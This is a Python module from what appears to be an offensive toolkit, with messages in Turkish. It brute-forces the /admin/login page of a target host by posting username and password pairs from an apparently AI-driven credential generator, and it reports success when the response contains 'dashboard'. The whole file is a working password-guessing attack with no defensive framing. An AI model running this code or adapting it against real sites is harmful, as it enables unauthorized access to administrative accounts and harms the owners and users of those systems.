# modules/web_bruteforce.py

import requests
from tools.ai_suggestions import generate_credentials

def run_admin_brute(target):
    print("[🌐] Web admin brute-force saldırısı başlatılıyor...")

    url = f"http://{target}/admin/login"
    credentials = generate_credentials()

    for username, password in credentials:
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=5)
            if response.status_code == 200 and "dashboard" in response.text.lower():
                print(f"[+] Başarılı giriş: {username}:{password}")
                return {"username": username, "password": password, "success": True}
        except Exception as e:
            print(f"[-] Hata: {e}")
    print("[-] Başarılı giriş bulunamadı.")
    return {"success": False}
